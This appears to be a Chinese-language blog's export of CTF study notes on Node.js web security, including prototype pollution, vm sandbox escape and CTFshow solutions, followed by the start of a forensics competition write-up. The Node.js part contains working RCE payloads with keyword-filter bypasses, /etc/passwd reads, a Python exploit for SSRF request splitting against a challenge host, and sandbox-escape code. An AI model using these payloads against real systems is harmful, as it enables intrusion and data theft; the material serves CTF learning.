当前模块的目录名\n__filename: 当前模块的文件名, 这是当前模块文件的绝对路径(符号链接会被解析)\nexports变量是默认赋值给module.exports, 它可以被赋予新值, 它会暂时不会绑定到module.exports\nmodule: 在每个模块中, module的自由变量是对表达当前模块的对象的引用. 为方便起见, 还可以通过全局模块的exports访问module.exports module实际上不是全局的, 而是每个模块本地的\nrequire模块是引入模块, json或者本地文件, 可以从node_modules引入模块\n\n//引入json文件const jsonData = require(&#x27;./path/filename.json&#x27;);//引入 node_modules 模块或者 Node.js 内置模块const crypto = require(&#x27;crypto&#x27;);\n\n自行设置:\nglobal.charmersix=6\n\n\n经常使用的全局变量是__dirname, __filename\nHTTP服务//引入http核心模块var http = require(&#x27;http&#x27;);//创建一个服务var server = http.createServer();//绑定链接server.on(&#x27;request&#x27;, function (res,rs)&#123;    console.log(res.method); //打印请求方式    rs.write(&#x27;hello,world&#x27;);  //返回数据    rs.end(); //断开连接&#125;)//启动监听server.listen(8686,function ()&#123;    console.log(&#x27;请访问127.0.0.1:8686&#x27;)&#125;)\n\n\nchild_process(创建子进程)child_process提供了几种创建子进程的方式\n\n异步方法: spawn、exec、execFile、fork\n同步方法: spawnSync、execSync、execFileSync\n\n经过上面的同步和异步思想的理解, 创建子进程的同步异步方式应该不难理解\n在异步创建进程时, spawn是基础, 其他的fork/exec/execFile都是基于spawn来生成的\n同步创建进程可以使用child_process.spawnSync()、child_process.execSync()和child_process.execFileSync(), 同步的方法会阻塞Node.js事件循环、暂停任何其他代码的执行, 直到子进程退出.\nNode.js特性大小写特性toUpperCase()toLowerCase()\n\n对于toUpperCase(): 字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;对于toLowerCase(): 字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)\n弱类型比较大小比较console.log(1==&#x27;1&#x27;); //trueconsole.log(1&gt;&#x27;2&#x27;); //falseconsole.log(&#x27;1&#x27;&lt;&#x27;2&#x27;); //trueconsole.log(111&gt;&#x27;3&#x27;); //trueconsole.log(&#x27;111&#x27;&gt;&#x27;3&#x27;); //falseconsole.log(&#x27;asd&#x27;&gt;1); //false\n\n\n总结: 数字与字符串比较时, 会优先将纯数字型字符串转化为数字之后再进行比较; 而字符串与字符串比较时, 会将字符串的第一个字符转化为ASCII码之后再进行比较, 因此就会出现第五行代码这种情况; 而非数字型字符串与任何数字进行比较都是false\n数组比较console.log([]==[]); //falseconsole.log([]&gt;[]); //falseconsole.log([6,2]&gt;[5]); //trueconsole.log([100,2]&lt;&#x27;test&#x27;); //trueconsole.log([1,2]&lt;&#x27;2&#x27;); //trueconsole.log([11,16]&lt;&#x27;10&#x27;); //false\n\n\n总结: 空数组之间比较永远为false, 数组之间比较只比较数组间的第一个值, 对第一个值采用前面总结的比较方法, 数组与非数值型字符串比较, 数组永远小于非数值型字符串, 数组与数值型字符串比较, 取第一个之后按前面总结的方法进行比较\n一些比较特别的相等console.log(null==undefined); //trueconsole.log(null===undefined); //falseconsole.log(NaN==NaN); //falseconsole.log(NaN===NaN); //false\n\n\n变量拼接console.log(5+[6,3]); //56,3console.log(&quot;5&quot;+6); //56console.log(&quot;5&quot;+[6,6]); //56,6console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6\n\n\nMD5的绕过a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)\n\na[x]=1&amp;b[x]=2\n数组会被解析成[object Object]\na=&#123;&#x27;x&#x27;:&#x27;1&#x27;&#125;b=&#123;&#x27;x&#x27;:&#x27;2&#x27;&#125; console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)\n\n\na=[1]b=[2] console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)\n\n\n编码绕过16进制编码console.log(&quot;a&quot;===&quot;\\x61&quot;); //true\n\nUnicode编码console.log(&quot;\\u0061&quot;===&quot;a&quot;); //true\n\nbase编码eval(Buffer.from(&#x27;Y29uc29sZS5sb2coImhlbGxvIHdvcmxkIik7&#x27;,&#x27;base64&#x27;).toString());\n\n\nNode.js危险函数的利用命令执行/代码执行exec()require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);\n\n\neval()console.log(eval(&quot;document.cookie&quot;)); //执行document.cookieconsole.log(&quot;document.cookie&quot;); //输出document.cookie\n\n文件读写readFileSync()require(&#x27;fs&#x27;).readFile(&#x27;/etc/passwd&#x27;, &#x27;utf-8&#x27;, (err, data) =&gt; &#123; if (err) throw err; console.log(data);&#125;);\n\nreadFile()require(&#x27;fs&#x27;).readFileSync(&#x27;/etc/passwd&#x27;,&#x27;utf-8&#x27;)\n\nwriteFileSync()require(&#x27;fs&#x27;).writeFileSync(&#x27;input.txt&#x27;,&#x27;sss&#x27;);\n\nwriteFile()require(&#x27;fs&#x27;).writeFile(&#x27;input.txt&#x27;,&#x27;test&#x27;,(err)=&gt;&#123;&#125;)\n\nRCE_ByPass原型\nrequire(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;);\n\n字符拼接\nrequire(&#x27;child_process&#x27;)[&#x27;exe&#x27;+&#x27;cSync&#x27;](&#x27;calc&#x27;); //web中+记得url编码一下\\require(&#x27;child_process&#x27;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;calc&quot;);\n\n\n\n编码绕过\nrequire(&quot;child_process&quot;)[&quot;\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;);require(&quot;child_process&quot;)[&quot;\\u0065\\u0078\\u0065\\u0063\\u0053\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;);eval(Buffer.from(&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdjYWxjJyk7&#x27;,&#x27;base64&#x27;).toString());\n\n\n模板拼接\nrequire(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#x27;calc&#x27;)\n\n\n其他函数\nrequire(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//调用某个可执行文件，在第二个参数传args* require(&quot;child_process&quot;).spawn(&#x27;sleep&#x27;, [&#x27;3&#x27;]); require(&quot;child_process&quot;).spawnSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]); require(&quot;child_process&quot;).execFileSync(&#x27;sleep&#x27;, [&#x27;3&#x27;]);\n\nNode.js中的ssrf通过拆分请求实现的ssrf攻击\n原理虽然用户发出的HTTP请求通常将请求路径指定为字符串, 但node.js最终必须将请求作为原始字节输出. JavaScript支持Unicode字符串, 因此将他们转换为字节意味着选择并应用适当的Unicode编码. 对于不包含主体的请求, Node.js默认使用latin1, 这是一种单字节编码, 不能表示高编码的Unicode字符, 相反, 这些字符被截断为其JavaScript表示的最低字节\n&gt; v = &quot;/caf\\u&#123;E9&#125;\\u&#123;01F436&#125;&quot;&#x27;/café🐶&#x27;&gt; Buffer.from(v,&#x27;latin1&#x27;).toString(&#x27;latin1&#x27;)&#x27;/café=6&#x27;\n\n\nCrlf HTTP头注入&gt; require(&#x27;http&#x27;).get(&#x27;http://example.com/\\r\\n/test&#x27;)._header&#x27;GET //test HTTP/1.1\\r\\nHost: example.com\\r\\nConnection: close\\r\\n\\r\\n&#x27;\n\n\n通过crlf结合ssrf利用\n通过一个题目学习一下\n源码\nvar express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;); // 处理文件路径var http = require(&#x27;http&#x27;);var pug = require(`pug`); // 模板渲染var morgan = require(&#x27;morgan&#x27;); // 日志中间件const multer = require(&#x27;multer&#x27;); // 用于处理multipart/form-data类型的表单数据，实现上传功能；个人一般使用formidable实现上传// 将上传的文件存储在./dist[自动创建]返回一个名为file的文件数组app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));// 使用简化版日志app.use(morgan(&#x27;short&#x27;));// 静态文件路由app.use(&quot;/uploads&quot;, express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;, express.static(path.join(__dirname, &#x27;/template&#x27;)))app.get(&#x27;/&#x27;, function (req, res) &#123;    // GET方法获取action参数    var action = req.query.action ? req.query.action : &quot;index&quot;;    // action中不能包含/ &amp; \\    if (action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;)) &#123;        res.send(&quot;Errrrr, You have been Blocked&quot;);    &#125;    // 将/template/[action].pug渲染成html输出到根目录    file = path.join(__dirname + &#x27;/template/&#x27; + action + &#x27;.pug&#x27;);    var html = pug.renderFile(file);    res.send(html);&#125;);app.post(&#x27;/file_upload&#x27;, function (req, res) &#123;    var ip = req.connection.remoteAddress; // remoteAddress无法伪造，因为TCP有三次握手，伪造源IP会导致无法完成TCP连接    var obj = &#123;msg: &#x27;&#x27;,&#125;    // 请求必须来自localhost    if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;        obj.msg = &quot;only admin&#x27;s ip can use it&quot;        res.send(JSON.stringify(obj));        return    &#125;    fs.readFile(req.files[0].path, function (err, data) &#123;        if (err) &#123;            obj.msg = &#x27;upload failed&#x27;;            res.send(JSON.stringify(obj));        &#125; else &#123;            // 文件路径为/uploads/[mimetype]/filename，mimetype可以进行目录穿越实现将文件存储至/template并利用action渲染到界面            var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype + &quot;/&quot;;            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if (!fs.existsSync(__dirname + file_path)) &#123;                try &#123;                    fs.mkdirSync(__dirname + file_path)                &#125; catch (error) &#123;                    obj.msg = &quot;file type error&quot;;                    res.send(JSON.stringify(obj));                    return                &#125;            &#125;            try &#123;                fs.writeFileSync(dir_file, data)                obj = &#123;msg: &#x27;upload success&#x27;, filename: file_path + file_name&#125;            &#125; catch (error) &#123;                obj.msg = &#x27;upload failed&#x27;;            &#125;            res.send(JSON.stringify(obj));        &#125;    &#125;)&#125;)// 查看题目源码app.get(&#x27;/source&#x27;, function (req, res) &#123;    res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;);app.get(&#x27;/core&#x27;, function (req, res) &#123;    var q = req.query.q;    var resp = &quot;&quot;;    if (q) &#123;        var url = &#x27;http://localhost:8081/source?&#x27; + q        console.log(url)        // 对url字符进行waf        var trigger = blacklist(url);        if (trigger === true) &#123;            res.send(&quot;error occurs!&quot;);        &#125; else &#123;            try &#123;                // node对/source发出请求，此处可以利用字符破坏进行切分攻击访问/file_upload路由(❗️此请求发出者为localhost主机)，实现对remoteAddress的绕过                http.get(url, function (resp) &#123;                    resp.setEncoding(&#x27;utf8&#x27;);                    resp.on(&#x27;error&#x27;, function (err) &#123;                        if (err.code === &quot;ECONNRESET&quot;) &#123;                            console.log(&quot;Timeout occurs&quot;);                        &#125;                    &#125;);                    // 返回结果输出到/core                    resp.on(&#x27;data&#x27;, function (chunk) &#123;                        try &#123;                            resps = chunk.toString();                            res.send(resps);                        &#125; catch (e) &#123;                            res.send(e.message);                        &#125;                    &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123;                        res.send(e.message);                    &#125;);                &#125;);            &#125; catch (error) &#123;                console.log(error);            &#125;        &#125;    &#125; else &#123;        res.send(&quot;search param &#x27;q&#x27; missing!&quot;);    &#125;&#125;)// 关键字waf 利用字符串拼接实现绕过function blacklist(url) &#123;    var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\\&quot;&quot;, &quot;&#x27;&quot;, &quot;!&quot;];    var arrayLen = evilwords.length;    for (var i = 0; i &lt; arrayLen; i++) &#123;        const trigger = url.includes(evilwords[i]);        if (trigger === true) &#123;            return true        &#125;    &#125;&#125;var server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;)\n\n攻击流程\n\n\n对/core路由发起切分攻击, 请求/core的同时还向/source路由发出上传文件的请求\n由于/路由是先读取/template目录下的pug文件再将其渲染到当前界面, 因此应该上传包含命令执行的pug文件, 文件虽然默认上传至/upload/目录下, 但可以通过目录穿越将文件上传到/template目录\n访问上传到/template目录下包含命令执行的pug文件\n\n\n大概看一下几个路由：\n\n/：会包含/template目录下的一个pug模板文件并用pub模板引擎进行渲染\n/source：回显源码\n/file_upload：限制了只能由127.0.0.1的ip将文件上传到uploads目录里面，所以需要进行ssrf。并且我们可以通过控制mimetype进行目录穿越，从而将文件上传到任意目录。\n/core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。\n\n\nnodejs在版本号小于8.x的时候存在unicode字符损坏导致的漏洞，而这个题目的版本刚好对的上（但是buu上的这个题并没有说版本），简单来说就是Unicode在解析的时候由于解码的类型问题导致部分被截断，字符出现变形，而原字符并非会被转义的危险字符造成的安全漏洞，具体就是先知社区这篇文章https://xz.aliyun.com/t/2894#toc-2\n所以构造一下payload，通过换行符使得服务器在core中发出的一次http请求变成两次，并且第二次请求内容我们完全可控可以先去upload目录上传文件抓一个包作为文件上传的模板，构造一下，赵总和出题人有两套不同的脚本构造字符，但是没有一个人说明这些字符是怎么构造出来的，并且两个脚本不互通，分别能用，但是尝试用赵总的脚本放一个命令执行的payload时直接把buu的环境打到了404。。。被迫重新开环境\n关于waf的绕过，想过直接二次编码绕过，因为这种ssrf发到服务器一次解码，服务器再发送到服务器二次解码，而检测只发生在第一次解码时，二次编码理论上超级绕过，但是这里编码需要把整个payload编码一遍，导致的结果就是第二个http包的部分内容也来了个二次编码，比如filename那里，在第二次发包的时候属于header内容，二次编码但解码只有一次（解码只对post和get提交的数据进行），会导致文件名有问题，但是那里如果只编码一次就会造成blacklist里面的引号限制过不去，所以说到底还是需要用截断字符这种编码方式去构造一个完全无关的字符而截断后却完全可利用的方式去攻击\n\nexp\nimport urllib.parseimport requestspayload = &#x27;&#x27;&#x27; HTTP/1.1POST /file_upload HTTP/1.1Host: 127.0.0.1:8081Content-Length: 266Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://127.0.0.1:8081Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG01qmiZ5h6Ap0QScUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://127.0.0.1:8081/?action=uploadAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryG01qmiZ5h6Ap0QScContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;Content-Type: ../templatedoctype htmlhtml  head    style      include ../../../../../../../flag.txt------WebKitFormBoundaryG01qmiZ5h6Ap0QSc--GET / HTTP/1.1test:&#x27;&#x27;&#x27;.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)def payload_encode(raw):    ret = u&quot;&quot;    for i in raw:        ret += chr(0x0100+ord(i))    return retpayload = payload_encode(payload)print(payload)r = requests.get(&#x27;http://057e3adb-a0dd-4ef8-b06c-b64f535de269.node4.buuoj.cn:81/core?q=&#x27; + urllib.parse.quote(payload))print(r.text)\n\n运行, 然后访问http://057e3adb-a0dd-4ef8-b06c-b64f535de269.node4.buuoj.cn:81/?action=shell即可\nNode.js原型链污染prototype和__proto__在JavaScript中, prototype对象是实现面向对象的一个重要机制\n它是函数所独有的, 它是从一个函数指向一个对象\n它的含义是函数的原型对象, 也就是构造函数所创建的实例的原型对象\n它就相当于是类的一个实例的模板, 原型的对象. 生成的对象都会参照这个原型对象; 生成实例化对象时, 如果自己没有的属性prototype有, 就会继承此属性, 有的话则不会覆盖\n例如下面这段js代码\nfunction Foo()&#123;    this.bar = 1&#125;Foo.prototype.show = function show()&#123;    console.log(this.bar)&#125;let foo = new Foo()foo.show()\n\n\n可以看到, 我们可以通过prototype属性, 指向到这个函数的原型对象中然后创建一个show()函数, 功能输出为this.bar\n\n我们可以认为原型 prototype是类Foo的一个属性，而所有用Foo类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上面中的foo对象，其天生就具有foo.show()方法。\n\n如上面所说, 我们可以通过Foo.prototype来访问Foo类的原型, 但Foo实例化出来的对象, 是不能通过prototype访问原型的, 这时候就该__proto__登场了\n不同于prototype是函数特有的, 它是对象所独有的, proto属性都是由一个对象指向一个对象, 即指向它们的原型对象(也可以理解为父对象)\n\n一个Foo类实例化出来的Foo对象, 可以通过foo.__proto__属性来访问Foo类的原型, 也就是说: foo.__proto__===Foo.prototype(True)\n即: prototype是一个类的属性, 所有类对象在实例化的时候将会拥有prototype中的属性和方法. 一个对象的__proto__属性, 指向这个对象所在类的prototype属性\n\n原型链继承思想function Father() &#123;    this.first_name = &#x27;Donald&#x27;    this.last_name = &#x27;Trump&#x27;&#125;function Son() &#123;    this.first_name = &#x27;Melania&#x27;&#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)console.log(son.__proto__)console.log(son.__proto__.__proto__)console.log(son.__proto__.__proto__.__proto__)\n\n\nSon类继承了Father类的last_name属性, 最后输出的是Name: Melania Trump\n\n总结: 对于对象son, 在console.log()调用son.last_name的时候, 实际上JavaScript引擎会进行如下操作:\n\n在对象son中寻找last_name\n如果找不到, 则在son.__proto__中寻找last_name\n如果仍然找不到, 则继续在son.__proto__.__proto__中寻找last_name\n依次寻找, 直到找到null结束, 比如, Object.prototype的__proto__就是null\n\n\n类似于Java里面继承的思想, 如果子类没有这个属性, 往上继承父类, 有的话就自己用自己的多态\nJavaScript的这个查找机制, 被运用在面向对象的继承中, 被称作prototype继承链\n\n每个构造函数(constructor)都有一个原型对象\n对象的__proto__属性, 指向类的原型对象prototype\nJavaScript使用prototype链实现继承机制\n\n原型链定义及如何污染原型链的核心就是依赖对象__proto__的指向, 当访问的属性在该对象不存在时, 就会向上从该对象构造函数的prototype进行查找, 直至查找到object的原型null为止\n\n由于对象之前存在继承关系, 所以当我们要使用或者输出一个变量就会通过原型链向上搜索, 当上层没有就会再向上上层搜索, 直到指向null, 若此时还为找到就会返回underfined\n图中原型链是cat-&gt;Cat.prototype-&gt;Object.prototype-&gt;null\n\n原型链污染就是修改其构造函数中的属性值, 使其他通过该构造函数实例化出的对象也具有这个属性的值\\\n由于对象是无序的, 当使用第二种方式访问对象时, 只能使用指明下标的方式去访问\n下面我们看一个简单的例子\n//foo是一个简单的JavaScript对象let foo = &#123;bar:1&#125;//foo.bar 此时为1console.log(foo.bar)//修改foo的原型 (即Object)foo.__proto__.bar = 2//由于查找顺序的原因, foo.bar仍然是1console.log(foo.bar)console.log(foo.__proto__)// 此时再用Object创建一个空的zoo对象let zoo = &#123;&#125;// 查看zoo.barconsole.log(zoo.bar)\n\n\n首先建立一个foo对象, 有一个bar属性为1, 此时它的原型对象并没有, 后面通过foo.__proto__指向它的原型对象, 也就是等价于是foo.prototype, 即Object, 给Object原型对象增加了bar属性, 值为2, 现在Object有了一个bar=2的prototype原型对象, 是空的\n但是在我们输出zoo.bar的时候, Node.js的引擎就开始在zoo中查找, 发现没有, 去zoo.__proto__中查找, 即在Object中查找, 而我们的foo.prototype.bar=2, 就是给Object添加了一个bar属性, 而这个属性被zoo继承\n这种修改了一个某个对象的原型对象，从而控制别的对象的操作，就是原型链污染\n原型链污染配合RCE有原型链污染的前提下, 我们可以控制基类的成员, 赋值为一串恶意代码, 从而导致代码注入\n//foo是一个简单的JavaScript对象let foo = &#123;bar:1&#125;//foo.bar 此时为1console.log(foo.bar)//修改foo的原型 (即Object)foo.__proto__.bar = require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;);//由于查找顺序的原因, foo.bar仍然是1console.log(foo.bar)// console.log(foo.__proto__)// 此时再用Object创建一个空的zoo对象let zoo = &#123;&#125;// 查看zoo.barconsole.log(zoo.bar)\n\n\nvm沙箱逃逸merge操作导致原型链污染其实找找能够控制数组(对象)的”键名”的操作即可设置__proto__的值\n\n对象merge\n对象clone (其实内核就是将待操作的对象merge到一个空对象中)\n\nmerge操作时最常见的可能控制键名的操作, 也最可能被原型链攻击 \n以对象merge为例, 我们想象一个简单的merge函数:\nfunction merge(target, source) &#123;    for (let key in source)&#123;        if (key in source&amp;&amp; key in target)&#123;            merge(target[key], source[key])                    &#125;else &#123;            target[key] = source[key]        &#125;    &#125;&#125;\n\n在合并过程中, 存在赋值的操作target[key] = source[key], 那么, 这个key如果是__proto__(json格式才可以被当成key), 是不是就可以原型污染\nfunction merge(target, source) &#123;    for (let key in source)&#123;        if (key in source&amp;&amp; key in target)&#123;            merge(target[key], source[key])        &#125;else &#123;            target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#x27;&#123;&quot;a&quot;:1, &quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#x27;)merge(object1, object2)console.log(object1.a , object1.b)object3 = &#123;&#125;console.log(object3.b)\n\n需要注意的点是：\n在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。\nejs污染参考: Express+lodash+ejs: 从原型链污染到RCE - evi0s’ Blog\nlodash污染参考: CVE-2019-10744\nloadash.defaultsDeep(obj.JSON.parse(objstr));\n\n只需要有objstr为\n&#123;&quot;content&quot;:&#123;&quot;prototype&quot;:&#123;&quot;constructor&quot;:&#123;&quot;a&quot;:&quot;b&quot;&#125;&#125;&#125;&#125;\n\n在合并时便会在Object上附加a=b这样一个属性\nlodash是一个非常流行的JavaScript工具库\nconst mergeFn = require(&#x27;lodash&#x27;).defaultsDeep;const payload = &#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;a0&quot;: true&#125;&#125;&#125;&#x27; function check() &#123;    mergeFn(&#123;&#125;, JSON.parse(payload));    if ((&#123;&#125;)[`a0`] === true) &#123;        console.log(`Vulnerable to Prototype Pollution via $&#123;payload&#125;`);    &#125;  &#125; check();\n\n运行上面的js语句，就可以检查这个版本的lodash是否存在这个漏洞。\n其中漏洞关键触发点在defaultsDeep函数，它将(&#123;&#125;, JSON.parse(payload))merge时，就可能导致原型链污染。使用JSON.parse就是保证合并时能以字典解析，而不是字符串\nJQuery污染参考: CVE-2019-11358\n版本小于3.4.0时 JQuery存在原型链污染漏洞\n$.extend(true,&#123;&#125;,JSON.parse(&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;aa&quot;:&quot;hello&quot;&#125;&#125;&#x27;))&#123;aa: &#x27;hello&#x27;&#125;var b = 1.2;undefinedb.aa;&#x27;hello&#x27;\n\n\nJquery可以用$.extend将两个字典merge，而这也因此污染了原型链。\nvm沙箱逃逸参考: mongo-express RCE(CVE-2019-10758)\nvm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸\n例子\nconst vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#x27;return this.process.env&#x27;)()`);console.log(env);\n\n执行之后可以获取主程序环境中的环境变量\n上面代码等价于下面代码\nconst vm = require(&#x27;vm&#x27;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&#x27;return this.process.env&#x27;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env);\n\n创建vm环境时, 首先要初始化一个对象sandbox, 这个对象就是vm中脚本执行时的全局环境context, vm脚本中全局this指向的就是这个对象\n因为this.constructor.constructor返回的是一个Function constructor, 所以可以利用function对象构造一个函数并执行. (此时function对象的上下文环境就是处于主程序中的)这里构造函数内的语句是return this.process.env, 结果是返回了主程序的环境变量\n配合chile_process.exec()就可以执行任意命令了:\nconst vm = require(&#x27;vm&#x27;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&#x27;return this.process&#x27;)();process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;).toString()`);console.log(env);\n\n\n做几个题(CTFshow)web334由前置知识可知\n\n在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。\n\n所以用ctfſhow 123456登录就可以出flag了\n但是这题其实直接用小写的ctshow就可以绕过\nweb335看见提示\n猜测后端为eval()代码执行\n尝试一下rce\nrequire(&#x27;child_process&#x27;).execSync(&#x27;tac f*&#x27;).toString()\n\n\n也可以借鉴yu师傅的\nrequire( &#x27;child_process&#x27; ).spawnSync( &#x27;tac&#x27;, [ &#x27;fl00g.txt&#x27; ] ).stdout.toString()\n\n或者使用fs读文件\n?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)  //查看当前目录?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl00g.txt&#x27;) //读取文件\n\nweb336过滤了execSync\n可以使用上面说的spawnSync或者fs\n也可以使用拼接绕过/编码绕过等等\n这里简单写几个payload, 其实是上面RCE_ByPass已经提到过的\nrequire(&#x27;child_process&#x27;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;ls&quot;).toString() //拼接绕过require(&quot;child_process&quot;)[&quot;\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;).toString() //编码绕过require(&quot;child_process&quot;)[&quot;\\u0065\\u0078\\u0065\\u0063\\u0053\\x79\\x6e\\x63&quot;](&#x27;calc&#x27;).toString()eval(Buffer.from(&#x27;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCd0YWMgZionKTs=&#x27;,&#x27;base64&#x27;).toString());\n\n\nweb337var express = require(&#x27;express&#x27;);var router = express.Router();var crypto = require(&#x27;crypto&#x27;);function md5(s) &#123;  return crypto.createHash(&#x27;md5&#x27;)    .update(s)    .digest(&#x27;hex&#x27;);&#125;/* GET home page. */router.get(&#x27;/&#x27;, function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;xxxxxxx&#x27;;  var a = req.query.a;  var b = req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;  \tres.end(flag);  &#125;else&#123;  \tres.render(&#x27;index&#x27;,&#123; msg: &#x27;tql&#x27;&#125;);  &#125;  &#125;);module.exports = router;\n\nmd5绕过 like php\na[x]=1&amp;b[x]=2b[]=1&amp;a[]=1\n\n\n\nweb338 重点在于login.js\nvar express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page.  */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123;  res.type(&#x27;html&#x27;);  var flag=&#x27;flag_here&#x27;;  var secert = &#123;&#125;;  var sess = req.session;  let user = &#123;&#125;;  utils.copy(user,req.body);  if(secert.ctfshow===&#x27;36dboy&#x27;)&#123;    res.end(flag);  &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;+JSON.stringify(user)&#125;);    &#125;    &#125;);module.exports = router;\n\n可以看到flag就在这里, 要想获得flag, 就需要使得secert.ctfshow===&#39;36dboy&#39;, 我们可以发现这里有个utils.copy , 就类似于merge函数, 存在原型污染\npayload:\n&#123;&quot;username&quot;:&quot;ctfhsow&quot;,&quot;password&quot;:&quot;ctfhsow&quot;,&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;\n\n\n","tags":["Web","Study","Node.js","JavaScript"]},{"title":"蓝帽杯_电子取证","url":"/2022/07/10/blue_hat/","content":"第一次做这么多取证题，也是学到了很多东西\n手机取证手机取证_1\n  ​    现对一个苹果手机进行取证，请您对以下问题进行分析解答。\n  ​    627604C2-C586-48C1-AA16-FF33C3022159.PNG图片的分辨率是？（答案参考格式：1920x1080）\n  ​    附件下载地址见平台公告，解压密码为0ba6b2c094cbb3a04681a135487a19cb\n\n盘古阅读器打开，搜索一下题目中的图片，得到\n\n我们保存下来，看一下属性\n得到分辨率\n\n手机取证_2还是上题做法，我们搜一下单号\n\n计算机取证计算机取证_1\n  现对一个windows计算机进行取证，请您对以下问题进行分析解答。\n  从内存镜像中获得taqi7的开机密码是多少？（答案参考格式：abcABC123）\n  附件下载地址见平台公告，解压密码为93ce7ea39bdd7baa137f1e9b963b7ee5\n\n内存取证，来到强大的vol\n详情见截图\n\n得到后，我们进行MD5解密\n\n计算机取证_2\n  制作该内存镜像的进程Pid号是多少？（答案参考格式：1024）\n\n这次我们打开火眼\n\n然后找到进程\n\n计算机取证_3\n  bitlokcer分区某office文件中存在的flag值为？（答案参考格式：flag{abcABC123}）\n\n来到取证大师，用小工具解析出密钥\n\n然后保存下来\n\n解开，得到两个office文件，全部导出\n\n再次套娃一层\n\n我们还能发现pass.txt,打开是个字典，正好可以爆破\n\n\n计算机取证_4\n  TrueCrypt加密中存在的flag值为？（答案参考格式：flag{abcABC123}）\n\n再回到vol\n\n万物皆可binwalk\n\n拿到了一坨压缩包，大致翻了翻，只有一个带密码的，好像有些东西\n\n好像损坏了，由于手头只有修zip的工具，生改后缀，成功，爆破\n\nflag：flag&#123;1349934913913991394cacacacacacc&#125;\napp取证程序分析_1\n  